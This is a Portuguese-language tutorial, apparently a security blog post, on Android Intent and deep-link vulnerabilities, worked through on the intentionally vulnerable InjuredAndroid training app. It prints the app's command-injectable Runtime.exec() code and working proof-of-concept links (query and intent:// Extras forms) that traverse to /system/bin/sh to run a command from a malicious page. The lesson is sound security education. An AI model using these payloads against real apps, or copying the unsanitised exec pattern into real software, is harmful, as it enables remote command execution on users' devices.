# Pequenas ligações, grandes vulnerabilidades: Uma breve introdução a deep links Android.

## AndroidManifest.xml

Esse artigo tem como objetivo introduzir as vulnerabilidades que ocorrem no Android por meio do abuso de Intents. Tentarei ser o mais introdutório possível e listarei todas as referências necessárias, caso algum conceito pareça muito avançado. Será utilizado o aplicativo [InjuredAndroid](https://github.com/B3nac/InjuredAndroid) como exemplo de *apk* vulnerável. 541v3 pros companheiros da [@duphouse](https://www.instagram.com/duphouse/), sem eles esse texto não seria possível.

Recomendo a [série de vídeos](https://www.youtube.com/watch?v=4eso_7RyZ58) do Maycon Vitali sobre Android no geral, assim como [a minha talk](https://www.youtube.com/watch?v=WFUEbMFx2EQ) na DupCon com vulnerabilidades reais. Existe também o [@thatmobileproject](https://www.instagram.com/thatmobileproject/) para posts sobre segurança em mobile.

## intent://

Os [Intents](https://developer.android.com/guide/components/intents-filters) funcionam como a principal forma dos aplicativos se comunicarem internamente entre si. Por exemplo, se um aplicativo quer abrir o [InjuredAndroid](https://github.com/B3nac/InjuredAndroid) ele pode iniciar-lo por meio de um Intent utilizando a [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) `flag13://rce`.

```java
Intent intent = new Intent();
intent.setData(Uri.parse("flag13://rce"));
startActivity(intent);
```

Além de aceitar todos os elementos de uma [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) ( scheme, host, path, query, fragment ), um Intent também pode levar dados [fortemente tipados](https://pt.wikipedia.org/wiki/Linguagem_tipada) por meio dos [Intent Extras](https://developer.android.com/reference/android/content/Intent#putExtra(java.lang.String,%20android.os.Bundle)). Na prática, *queries* e *extras* são as formas mais comuns de passar dados entre os aplicativos, eles serão discutidos com exemplos mais adiante.


## <intent-filter>

Como o Android sabe qual aplicativo se refere `flag13://rce`? O InjuredAndroid define um [Intent Filter](https://developer.android.com/guide/components/intents-filters#Resolution) que diz quais tipos de Intent o Sistema Operacional deve enviar para ele. O Intent Filter é definido no [AndroidManifest.xml](https://developer.android.com/guide/topics/manifest/manifest-intro).

Vamos analizar a definição do Intent Filter relacionado a `flag13://rce` : https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/AndroidManifest.xml

```xml
<activity
	android:name=".RCEActivity"
	android:label="@string/title_activity_rce"
	android:theme="@style/AppTheme.NoActionBar">
	<intent-filter android:label="filter_view_flag11">
		<action android:name="android.intent.action.VIEW" />
		<category android:name="android.intent.category.DEFAULT" />
		<category android:name="android.intent.category.BROWSABLE" />
		<!-- Accepts URIs that begin with "flag13://” -->
        <data
			android:host="rce"
			android:scheme="flag13" />
	</intent-filter>
</activity>
```

O atributo `name` define qual [Activity](https://developer.android.com/reference/android/app/Activity) será inicializada, como ele começa com ponto, o nome é resolvido para `package`+`.RCEActivity` = `b3nac.injuredandroid.RCEActivity`. Dentro do `<intent-filter>`, o `action` se refere ao [tipo de ação](https://developer.android.com/reference/android/content/Intent#intent-structure) que será executada, existem uma miríade de tipos de ações que são definidas na classe Intent, porém, na maioria das vezes é utilizado o `action` padrão `android.intent.action.VIEW`.

`category` são propriedades extras que definem como o Intent vai se comportar. `android.intent.category.DEFAULT` define que essa Activity pode ser inicializada mesmo se o Intent não tiver nenhum `category`. `android.intent.category.BROWSABLE` dita que a Activity pode ser inicializada pelo browser, isso é super importante pois transforma qualquer ataque em remoto. Digamos que um usuário entre em um site malicioso, esse site consegue inicializar um Intent que abre o App apenas se o Intent Filter tiver a propriedade `BROWSABLE`.

A *tag* [`data`](https://developer.android.com/guide/topics/manifest/data-element) especifica quais URLs vão corresponder com esse Intent Filter, no nosso caso, o `scheme` tem que ser `flag13` e o `host` igual a `rce`, ficando `flag13://rce`. Todas as partes da URI podem ser definidas, como *path*, *port*, etc. 


## flag13://rce

Agora que entedemos como Intents e Intents Filters funcionam, vamos procurar alguma vulnerabilidade no `flag13://rce` (O "rce" ficou meio óbvio né).

O código-fonte da Activity `b3nac.injuredandroid.RCEActivity` : https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/java/b3nac/injuredandroid/RCEActivity.kt

```kotlin
49 if (intent != null && intent.data != null) {
50     copyAssets()
51     val data = intent.data
52     try {
53         val intentParam = data!!.getQueryParameter("binary")
54         val binaryParam = data.getQueryParameter("param")
55         val combinedParam = data.getQueryParameter("combined")
56         if (combinedParam != null) {
57             childRef.addListenerForSingleValueEvent(object : ValueEventListener {
58                 override fun onDataChange(dataSnapshot: DataSnapshot) {
59                     val value = dataSnapshot.value as String?
60                     if (combinedParam == value) {
61                         FlagsOverview.flagThirteenButtonColor = true
62                         val secure = SecureSharedPrefs()
63                         secure.editBoolean(applicationContext, "flagThirteenButtonColor", true)
64                         correctFlag()
65                     } else {
66                         Toast.makeText(this@RCEActivity, "Try again! :D",
67                                 Toast.LENGTH_SHORT).show()
68                     }
69                 }
70
71                 override fun onCancelled(databaseError: DatabaseError) {
72                     Log.e(TAG, "onCancelled", databaseError.toException())
73                 }
74             })
75         }
```

A Activity é inicializada na função `onCreate` e é lá que o Intent será devidamente tratado. Na linha [49](https://github.com/B3nac/InjuredAndroid/blob/master/InjuredAndroid/app/src/main/java/b3nac/injuredandroid/RCEActivity.kt#L49) o aplicativo checa se `intent` é nulo, se não for ele irá pegar algumas *queries* `binary`, `param` e `combined`. Se `combined` for nulo ele não entrará no `if` da linha 56 e irá para o seguinte `else`:

```kotlin
76 else {
77
78     val process = Runtime.getRuntime().exec(filesDir.parent + "/files/" + intentParam + " " + binaryParam)
79     val bufferedReader = BufferedReader(
80             InputStreamReader(process.inputStream))
81     val log = StringBuilder()
82     bufferedReader.forEachLine {
83         log.append(it)
84     }
85     process.waitFor()
86     val tv = findViewById<TextView>(R.id.RCEView)
87     tv.text = log.toString()
88 }
```

Na linha 78 é passado para a função `Runtime.getRuntime().exec()` as variáveis `intentParam` e `binaryParam`, essa função executa comandos no sistema, logo temos um [Command Injection](https://owasp.org/www-community/attacks/Command_Injection) através do Intent. Vamos tentar explora-lo!

Normalmente, num Command Injection tentaríamos passar algum carácter para executar outro commando, como `&`/`|`/`;`, porém se tentarmos desse jeito o Android irá dar um erro na primeira parte do comando, o `filesDir.parent + "/files/"`, pois não encontrará o arquivo, ou dará erro de permissão e não executará o resto do nosso *payload*. Para resolvermos esse problema podemos voltar os diretórios com `../` até chegarmos no diretório *root*, a partir dai podemos executar o `/system/bin/sh` e executar qualquer comando que quisermos.

Nossa PoC terá os seguintes passos :

1. Alvo clica num link malicioso
2. Browser abre um Intent para `b3nac.injuredandroid.RCEActivity`
3. A Activity `RCEActivity` executa o comando do atacante

`index.html`
```html
<a href="flag13://rce?binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27&param=1">pwn me</a>
```

*Deixo de tarefa de casa exfiltrar o resultado do comando, ou abrir uma reverse shell no Android*

## S.Intent_Extras

Agora digamos que ao invés de receber as variáveis via *query*, o App as recebesse via Intent Extras, como fazer? Para criar um Intent com Extras apenas usamos a função [putExtra](https://developer.android.com/reference/android/content/Intent#putExtra(java.lang.String,%20android.os.Parcelable)).

```java
Intent intent = new Intent();
intent.setData(Uri.parse("flag13://rce"));
intent.putExtra("binary","../../../../../system/bin/sh -c 'id'");
intent.putExtra("param","1");
startActivity(intent);
```

Ok, com isso conseguimos passar Intents Extras por meio de outro App, mas e pelo Browser? Nós podemos utilizar o scheme [`intent://`](https://developer.chrome.com/docs/multidevice/android/intents/) para isso! O Intent de cima fica assim :

```html
<a href="intent://rce/#Intent;scheme=flag13;S.binary=..%2F..%2F..%2F..%2F..%2Fsystem%2Fbin%2Fsh%20-c%20%27id%27;S.param=1;end">pwn me</a>
```

Primeiro vem o scheme `intent://`, depois o host `rce` e logo após a string `#Intent`, que é obrigatória. A partir dai todas as variáveis são delimitadas por `;`. Passamos o `scheme=flag13` e definimos os Extras, o nome do Extra é precedido do tipo dele, como o Extra `binary` é do tipo String ele é definido com `S.binary`. Os Extras podem ter vários tipos, como a documentação do scheme `intent://` é escarso, o melhor jeito é ler o código fonte do Android que faz o parse dele:  https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/android/content/Intent.java;l=7115;drc=master

```java
if      (uri.startsWith("S.", i)) b.putString(key, value);
else if (uri.startsWith("B.", i)) b.putBoolean(key, Boolean.parseBoolean(value));
else if (uri.startsWith("b.", i)) b.putByte(key, Byte.parseByte(value));
else if (uri.startsWith("c.", i)) b.putChar(key, value.charAt(0));
else if (uri.startsWith("d.", i)) b.putDouble(key, Double.parseDouble(value));
else if (uri.startsWith("f.", i)) b.putFloat(key, Float.parseFloat(value));
else if (uri.startsWith("i.", i)) b.putInt(key, Integer.parseInt(value));
else if (uri.startsWith("l.", i)) b.putLong(key, Long.parseLong(value));
else if (uri.startsWith("s.", i)) b.putShort(key, Short.parseShort(value));
else throw new URISyntaxException(uri, "unknown EXTRA type", i);
```


Por fim só colocar um `end` (:


## ;end

Podem existir vários tipos de vulnerabilidades oriundas dos Intents, RCE/SQLi/XSS até Buffer Overflow, vai depender só da criatividade do desenvolvedor. Para estudar esse assunto mais a fundo, recomendo a leitura do blog do [@bagipro_](https://twitter.com/_bagipro) https://blog.oversecured.com/ e dos reports públicos de Bug Bounty https://github.com/B3nac/Android-Reports-and-Resources . Além do [InjuredAndroid]((https://github.com/B3nac/InjuredAndroid)) também podem brincar com o [Ovaa](https://github.com/oversecured/ovaa). |-|4ck th3 |>l4n3t  
